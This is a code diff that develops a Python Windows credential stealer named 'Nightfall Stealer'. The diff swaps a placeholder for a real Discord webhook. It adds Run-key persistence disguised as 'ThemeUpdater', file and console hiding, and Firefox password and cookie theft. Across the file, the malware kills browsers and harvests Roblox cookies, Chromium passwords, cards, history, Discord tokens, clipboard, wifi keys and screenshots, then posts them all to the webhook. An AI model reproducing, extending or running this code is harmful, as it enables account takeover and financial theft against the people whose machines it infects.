@@ -1,3 +1,7 @@
+import ctypes
+import winreg as reg
+import sys
+import shutil
 import os
 import subprocess
 import time
@@ -7,6 +11,7 @@ import re
 import threading
 import zipfile
 import requests
+import json
 from sqlite3 import connect as sql_connect
 from datetime import datetime, timezone, timedelta
 from base64 import b64decode
@@ -18,7 +23,7 @@ import win32crypt
 import win32clipboard
 from Crypto.Cipher import AES
 
-WEBHOOK = "puturwebhookhere"
+WEBHOOK = "https://discord.com/api/webhooks/1500015797609697392/kLPeBc9kCIo7G-HtGyV3Ddfduji1xG3GXzKlh7hTv2Nsp7IDm9jK_27jo5aVzJzt_8TL"
 TEMP = os.getenv("TEMP") or os.path.expanduser("~/AppData/Local/Temp")
 WORK_DIR = os.path.join(TEMP, f"NF_{random.randint(10000, 99999)}")
 os.makedirs(WORK_DIR, exist_ok=True)
@@ -47,15 +52,29 @@ def get_ip():
 def send_embed(title, desc="", color=0x191919, fields=None, files=None, thumbnail=None, image=None):
     embed = {
         "title": title,
-        "description": f"```ansi\n{desc}\n```" if desc else None,
         "color": color,
         "timestamp": datetime.utcnow().isoformat(),
         "footer": {"text": "Nightfall Stealer", "icon_url": "https://files.catbox.moe/nt0b4j.png"},
     }
-    if fields: embed["fields"] = fields
-    if thumbnail: embed["thumbnail"] = {"url": thumbnail}
-    if image: embed["image"] = {"url": image}
-    payload = {"username": "Nightfall Stealer", "avatar_url": "https://files.catbox.moe/nt0b4j.png", "embeds": [embed]}
+    
+    if desc:
+        embed["description"] = f"```ansi\n{desc}\n```"
+    
+    if fields:
+        embed["fields"] = fields
+    
+    if thumbnail:
+        embed["thumbnail"] = {"url": thumbnail}
+    
+    if image:
+        embed["image"] = {"url": image}
+    
+    payload = {
+        "username": "Nightfall Stealer", 
+        "avatar_url": "https://files.catbox.moe/nt0b4j.png", 
+        "embeds": [embed]
+    }
+    
     try:
         if files:
             requests.post(WEBHOOK, data={"payload_json": dumps(payload)}, files=files, timeout=15)
@@ -65,7 +84,8 @@ def send_embed(title, desc="", color=0x191919, fields=None, files=None, thumbnai
         pass
 
 def send_full_txt(title, lines):
-    if not lines: return
+    if not lines:
+        return
     fname = f"{title.lower().replace(' ','_')}_{random.randint(10000,99999)}.txt"
     path = os.path.join(WORK_DIR, fname)
     with open(path, "w", encoding="utf-8", errors="replace") as f:
@@ -178,84 +198,95 @@ def get_roblox_user_info(cookie):
 def process_roblox_accounts(cookies_list):
     roblox_accounts = []
     roblox_cookies = []
-    
+   
     for cookie in cookies_list:
         if cookie.get('name') == '.ROBLOSECURITY' and cookie.get('value'):
-            roblox_cookies.append({
-                'value': cookie.get('value'),
-                'domain': cookie.get('domain', ''),
-                'browser': cookie.get('browser', 'Unknown'),
-                'profile': cookie.get('profile', 'Unknown')
-            })
-    
+            cookie_value = cookie.get('value')
+            if len(cookie_value) > 50:
+                roblox_cookies.append({
+                    'value': cookie_value,
+                    'domain': cookie.get('domain', ''),
+                    'browser': cookie.get('browser', 'Unknown'),
+                    'profile': cookie.get('profile', 'Unknown')
+                })
+   
     if not roblox_cookies:
-        return
-    
-    send_embed("🔍 Roblox Accounts Found", f"Found **{len(roblox_cookies)}** .ROBLOSECURITY cookie(s)", 0x00ff88)
+        send_embed("⚠️ Roblox", "No .ROBLOSECURITY cookies found", 0xff8800)
+        return False
     
     for idx, cookie_info in enumerate(roblox_cookies, 1):
         try:
             user_info = get_roblox_user_info(cookie_info['value'])
-            
+           
             if user_info:
-                total_robux = user_info['robux'] + user_info['pending_robux']
+                cookie_preview = cookie_info['value'][:50] + "..." if len(cookie_info['value']) > 50 else cookie_info['value']
                 
-                fields = [
-                    {"name": "🎮 Username", "value": f"**{user_info['username']}**", "inline": True},
-                    {"name": "📛 Display Name", "value": user_info['display_name'], "inline": True},
-                    {"name": "🆔 User ID", "value": f"`{user_info['id']}`", "inline": True},
-                    {"name": "💰 Current Robux", "value": f"**{user_info['robux']:,}**", "inline": True},
-                    {"name": "📈 RAP (Total)", "value": f"**{user_info['rap']:,}**", "inline": True},
-                    {"name": "⏳ Pending Robux", "value": f"**{user_info['pending_robux']:,}**", "inline": True},
-                    {"name": "💎 Total Value", "value": f"**{total_robux:,} Robux**", "inline": True},
-                    {"name": "⭐ Premium", "value": "Premium" if user_info['membership'] else "no", "inline": True},
-                    {"name": "🍪 Cookie", "value": f"```\n{cookie_info['value']}\n```", "inline": False},
-                    {"name": "🌐 Browser", "value": cookie_info['browser'], "inline": True},
-                    {"name": "📁 Profile", "value": cookie_info['profile'], "inline": True},
-                ]
+                description = f"**Browser:** {cookie_info['browser']}\n**Profile:** {cookie_info['profile']}\n**Domain:** {cookie_info['domain']}\n\n**Cookie:**\n```\n{cookie_info['value']}\n```"
                 
-                if user_info['created_date'] != "Unknown":
-                    created = user_info['created_date'].split('T')[0] if 'T' in user_info['created_date'] else user_info['created_date']
-                    fields.append({"name": "📅 Account Created", "value": created, "inline": True})
+                embed = {
+                    "title": f"🎮 Roblox Account #{idx} - {user_info['username']}",
+                    "description": description[:4096],
+                    "color": 0x00ff88,
+                    "timestamp": datetime.utcnow().isoformat(),
+                    "footer": {"text": "Nightfall Stealer"},
+                    "fields": [
+                        {"name": "🆔 User ID", "value": f"`{user_info['id']}`", "inline": True},
+                        {"name": "💰 Robux", "value": f"**{user_info['robux']:,}**", "inline": True},
+                    ]
+                }
                 
-                if user_info['description'] and user_info['description'] != "No description":
-                    desc_preview = user_info['description'][:100] + "..." if len(user_info['description']) > 100 else user_info['description']
-                    fields.append({"name": "📝 Bio", "value": desc_preview, "inline": False})
+                if user_info.get('avatar_url'):
+                    embed["thumbnail"] = {"url": user_info['avatar_url']}
                 
-                send_embed(
-                    f"🎮 Roblox Account #{idx} - {user_info['username']}",
-                    f"**Cookie found in:** {cookie_info['browser']} ({cookie_info['profile']})\n**Domain:** {cookie_info['domain']}",
-                    0x00ff88,
-                    fields=fields,
-                    thumbnail=user_info['avatar_url'],
-                    image=user_info['banner_url']
-                )
+                payload = {
+                    "username": "Nightfall Stealer",
+                    "avatar_url": "https://files.catbox.moe/nt0b4j.png",
+                    "embeds": [embed]
+                }
                 
-                cookie_line = f"Roblox Account #{idx}\nUsername: {user_info['username']}\nDisplay: {user_info['display_name']}\nUser ID: {user_info['id']}\nRobux: {user_info['robux']:,}\nRAP: {user_info['rap']:,}\nPending: {user_info['pending_robux']:,}\nTotal Value: {total_robux:,}\nMembership: {'Premium' if user_info['membership'] else 'Free'}\nCookie: {cookie_info['value']}\nBrowser: {cookie_info['browser']}\nProfile: {cookie_info['profile']}\nDomain: {cookie_info['domain']}\n{'='*70}"
+                try:
+                    requests.post(WEBHOOK, json=payload, timeout=30)
+                except:
+                    pass
+                
+                time.sleep(0.5)
+               
+                cookie_line = f"Roblox Account #{idx}\nUsername: {user_info['username']}\nUser ID: {user_info['id']}\nRobux: {user_info['robux']:,}\nCookie: {cookie_info['value']}\nBrowser: {cookie_info['browser']}\nProfile: {cookie_info['profile']}\n{'='*70}"
                 roblox_accounts.append(cookie_line)
-                
+               
         except Exception as e:
-            cookie_line = f"Roblox Cookie (Processing Failed)\nCookie: {cookie_info['value']}\nBrowser: {cookie_info['browser']}\nProfile: {cookie_info['profile']}\nDomain: {cookie_info['domain']}\nError: {str(e)[:100]}\n{'='*70}"
+            cookie_line = f"Roblox Cookie (Failed)\nCookie: {cookie_info['value']}\nBrowser: {cookie_info['browser']}\nProfile: {cookie_info['profile']}\nError: {str(e)[:100]}\n{'='*70}"
             roblox_accounts.append(cookie_line)
-    
+   
     if roblox_accounts:
         fname = f"roblox_accounts_{random.randint(10000,99999)}.txt"
         path = os.path.join(WORK_DIR, fname)
         with open(path, "w", encoding="utf-8", errors="replace") as f:
             f.write(NIGHTFALL_ASCII + "\n\n")
-            f.write("ROBLOX ACCOUNTS — SECURITY COOKIES\n")
+            f.write("ROBLOX ACCOUNTS\n")
             f.write("═"*70 + "\n\n")
             f.write("\n".join(roblox_accounts))
             f.write("\n\n" + "═"*70 + "\n")
-            f.write(f"Total Accounts Found: {len(roblox_accounts)}\n")
-            f.write("Generated: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
-        
+            f.write(f"Total: {len(roblox_accounts)}\n")
+       
         try:
             with open(path, "rb") as f:
                 files = {"file": (fname, f, "text/plain")}
-                send_embed("📦 Roblox Accounts Archive", f"**{len(roblox_accounts)}** account(s) saved", 0x00ff88, files=files)
+                payload = {
+                    "username": "Nightfall Stealer",
+                    "avatar_url": "https://files.catbox.moe/nt0b4j.png",
+                    "embeds": [{
+                        "title": "📦 Roblox Archive",
+                        "description": f"**{len(roblox_accounts)}** account(s) saved",
+                        "color": 0x00ff88,
+                        "timestamp": datetime.utcnow().isoformat()
+                    }]
+                }
+                requests.post(WEBHOOK, data={"payload_json": dumps(payload)}, files=files, timeout=30)
         except:
             pass
+    
+    return False
 
 def download_and_run_chromelevator():
     TEMP = os.environ.get("TEMP")
@@ -403,22 +434,20 @@ def download_and_run_chromelevator():
             save_path_txt = os.path.join(cookies_temp_path, fname_txt)
 
             with open(save_path_json, "w", encoding="utf-8", errors="replace") as f:
-                if 'NIGHTFALL_ASCII' in globals() or 'NIGHTFALL_ASCII' in locals():
-                    try:
-                        f.write(NIGHTFALL_ASCII)
-                        f.write("\n")
-                    except:
-                        pass
+                try:
+                    f.write(NIGHTFALL_ASCII)
+                    f.write("\n")
+                except:
+                    pass
                 json_dump = dumps(all_cookies, indent=2, ensure_ascii=False)
                 f.write(json_dump)
 
             with open(save_path_txt, "w", encoding="utf-8", errors="replace") as f:
-                if 'NIGHTFALL_ASCII' in globals() or 'NIGHTFALL_ASCII' in locals():
-                    try:
-                        f.write(NIGHTFALL_ASCII)
-                        f.write("\n\n")
-                    except:
-                        pass
+                try:
+                    f.write(NIGHTFALL_ASCII)
+                    f.write("\n\n")
+                except:
+                    pass
                 
                 for idx, cookie in enumerate(all_cookies, 1):
                     domain = cookie.get('domain', '')
@@ -502,22 +531,30 @@ def download_and_run_chromelevator():
 def steal_browser_data():
     browsers = [
         {"name": "Chrome", "base": os.getenv('LOCALAPPDATA') + "\\Google\\Chrome\\User Data"},
-        {"name": "Brave", "base": os.getenv('LOCALAPPDATA') + "\\Brave Software\\Brave-Browser\\User Data"},
+        {"name": "Brave", "base": os.getenv('LOCALAPPDATA') + "\\BraveSoftware\\Brave-Browser\\User Data"},
         {"name": "Edge", "base": os.getenv('LOCALAPPDATA') + "\\Microsoft\\Edge\\User Data"},
         {"name": "Opera", "base": os.getenv('APPDATA') + "\\Opera Software\\Opera Stable"},
         {"name": "Opera GX", "base": os.getenv('APPDATA') + "\\Opera Software\\Opera GX Stable"},
+        {"name": "Opera GX", "base": os.getenv('APPDATA') + "\\Opera Software\\Opera GX"},
+        {"name": "Opera GX", "base": os.getenv('LOCALAPPDATA') + "\\Opera Software\\Opera GX Stable"},
+        {"name": "Opera GX", "base": os.getenv('LOCALAPPDATA') + "\\Opera Software\\Opera GX"},
+        {"name": "Vivaldi", "base": os.getenv('LOCALAPPDATA') + "\\Vivaldi\\User Data"},
+        {"name": "Yandex", "base": os.getenv('LOCALAPPDATA') + "\\Yandex\\YandexBrowser\\User Data"},
+        {"name": "Chromium", "base": os.getenv('LOCALAPPDATA') + "\\Chromium\\User Data"},
     ]
     pw_lines = []
     cc_lines = []
     hist_lines = []
     for br in browsers:
         base = br["base"]
-        if not os.path.exists(base): continue
+        if not os.path.exists(base):
+            continue
         profiles = ["Default"] + [d for d in os.listdir(base) if d.startswith("Profile ") and os.path.isdir(os.path.join(base, d))]
         for prof in profiles:
             ppath = os.path.join(base, prof)
             master_key = get_master_key(ppath) or get_master_key(base)
-            if not master_key: continue
+            if not master_key:
+                continue
             pw_path = os.path.join(ppath, "Login Data")
             if os.path.exists(pw_path):
                 tmp = os.path.join(WORK_DIR, f"pw_{random.randint(10000,99999)}.db")
@@ -535,8 +572,10 @@ def steal_browser_data():
                 except:
                     pass
                 finally:
-                    try: os.remove(tmp)
-                    except: pass
+                    try:
+                        os.remove(tmp)
+                    except:
+                        pass
             cc_path = os.path.join(ppath, "Web Data")
             if os.path.exists(cc_path):
                 tmp = os.path.join(WORK_DIR, f"cc_{random.randint(10000,99999)}.db")
@@ -554,8 +593,10 @@ def steal_browser_data():
                 except:
                     pass
                 finally:
-                    try: os.remove(tmp)
-                    except: pass
+                    try:
+                        os.remove(tmp)
+                    except:
+                        pass
             hist_path = os.path.join(ppath, "History")
             if os.path.exists(hist_path):
                 tmp = os.path.join(WORK_DIR, f"hist_{random.randint(10000,99999)}.db")
@@ -570,8 +611,10 @@ def steal_browser_data():
                 except:
                     pass
                 finally:
-                    try: os.remove(tmp)
-                    except: pass
+                    try:
+                        os.remove(tmp)
+                    except:
+                        pass
     if pw_lines:
         send_full_txt("Passwords", pw_lines)
     if cc_lines:
@@ -647,7 +690,8 @@ def steal_discord_tokens():
     tokens = set()
     for base in possible_paths:
         leveldb = os.path.join(base, "Local Storage", "leveldb")
-        if not os.path.isdir(leveldb): continue
+        if not os.path.isdir(leveldb):
+            continue
         for ext in ("*.ldb", "*.log"):
             for file in Path(leveldb).rglob(ext):
                 try:
@@ -670,7 +714,8 @@ def steal_discord_tokens():
     ])
     for token in tokens:
         info = get_user_info(token)
-        if not info: continue
+        if not info:
+            continue
         disp = f"{info.get('global_name', '')} (@{info['username']})" if info.get('global_name') else info["username"]
         nitro_type = {0: "None", 1: "Classic", 2: "Full Nitro"}.get(info.get("premium_type", 0), "Unknown")
         mfa = "Yes" if info.get("mfa_enabled") else "No"
@@ -811,16 +856,53 @@ def create_final_zip():
     with open(zip_path, "rb") as f:
         files = {"file": (zip_name, f, "application/zip")}
         send_embed("nightfall full archive", "all of the fuckn shit combined in a zip", 0x191919, files=files)
-    try: os.remove(zip_path)
-    except: pass
+    try:
+        os.remove(zip_path)
+    except:
+        pass
+
+def hide_file(file_path):
+    try:
+        ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02 | 0x04)  
+    except:
+        pass
+
+def add_silent_startup():
+    persist_dir = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Themes")
+    persist_path = os.path.join(persist_dir, "themeupdater.exe")
+    
+    try:
+        os.makedirs(persist_dir, exist_ok=True)
+        
+        current_exe = sys.executable
+        if os.path.abspath(current_exe) != os.path.abspath(persist_path):
+            if os.path.exists(persist_path):
+                try:
+                    os.remove(persist_path)
+                except:
+                    pass
+            shutil.copy2(current_exe, persist_path)
+        
+        hide_file(persist_path)
+        
+        key = reg.OpenKey(reg.HKEY_CURRENT_USER, 
+                         r"Software\Microsoft\Windows\CurrentVersion\Run", 
+                         0, reg.KEY_SET_VALUE)
+        
+        reg.SetValueEx(key, "ThemeUpdater", 0, reg.REG_SZ, persist_path)
+        reg.CloseKey(key)
+        
+    except:
+        pass
 
 def main():
-    subprocess.call("taskkill /f /im discord.exe /im chrome.exe /im brave.exe /im msedge.exe /im opera.exe >nul 2>&1", shell=True)
+    subprocess.call("taskkill /f /im discord.exe /im chrome.exe /im brave.exe /im msedge.exe /im opera.exe /im operagx.exe /im firefox.exe >nul 2>&1", shell=True)
     send_embed("Nightfall Stealer Started")
     threading.Thread(target=download_and_run_chromelevator, daemon=True).start()
     threads = [
         threading.Thread(target=steal_discord_tokens, daemon=True),
         threading.Thread(target=steal_browser_data, daemon=True),
+        threading.Thread(target=steal_firefox_data, daemon=True),
         threading.Thread(target=steal_clipboard, daemon=True),
         threading.Thread(target=steal_wifi, daemon=True),
         threading.Thread(target=take_screenshot, daemon=True),
@@ -838,5 +920,76 @@ def main():
         pass
     send_embed("nightfall stealer finished", color=0x191919)
 
+def get_firefox_profiles():
+    profiles = []
+    base_path = os.path.join(os.getenv('APPDATA'), r"Mozilla\Firefox\Profiles")
+    if not os.path.exists(base_path):
+        return profiles
+    for item in os.listdir(base_path):
+        profile_path = os.path.join(base_path, item)
+        if os.path.isdir(profile_path):
+            profiles.append(profile_path)
+    return profiles
+
+def decrypt_firefox_passwords(profile_path):
+    lines = []
+    try:
+        logins_path = os.path.join(profile_path, "logins.json")
+        if not os.path.exists(logins_path):
+            return lines
+        with open(logins_path, "r", encoding="utf-8") as f:
+            data = json_loads(f.read())
+        for login in data.get("logins", []):
+            url = login.get("hostname", "")
+            username = login.get("username", "")
+            password = login.get("password", "")
+            if url or username or password:
+                lines.append(f"URL: {url}\nUser: {username}\nPass: {password}\n{'─'*70}")
+    except:
+        pass
+    return lines
+
+def steal_firefox_cookies(profile_path):
+    lines = []
+    try:
+        cookies_path = os.path.join(profile_path, "cookies.sqlite")
+        if not os.path.exists(cookies_path):
+            return lines
+        tmp = os.path.join(WORK_DIR, f"ff_cookies_{random.randint(10000,99999)}.db")
+        shutil.copy2(cookies_path, tmp)
+        conn = sql_connect(tmp)
+        cur = conn.cursor()
+        cur.execute("SELECT host, name, value FROM moz_cookies")
+        for host, name, value in cur.fetchall():
+            lines.append(f"Domain: {host} | Name: {name} | Value: {value}")
+        conn.close()
+        os.remove(tmp)
+    except:
+        pass
+    return lines
+
+def steal_firefox_data():
+    pw_lines = []
+    cookie_lines = []
+    profiles = get_firefox_profiles()
+    for prof in profiles:
+        pw_lines.extend(decrypt_firefox_passwords(prof))
+        cookie_lines.extend(steal_firefox_cookies(prof))
+    
+    if pw_lines:
+        send_full_txt("Firefox Passwords", pw_lines)
+    if cookie_lines:
+        send_full_txt("Firefox Cookies", cookie_lines)
+
 if __name__ == "__main__":
+    add_silent_startup()          
+    hide_file(sys.executable)
+    
+    try:
+        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+        if hwnd:
+            ctypes.windll.user32.ShowWindow(hwnd, 0)
+    except:
+        pass
+    
     main()
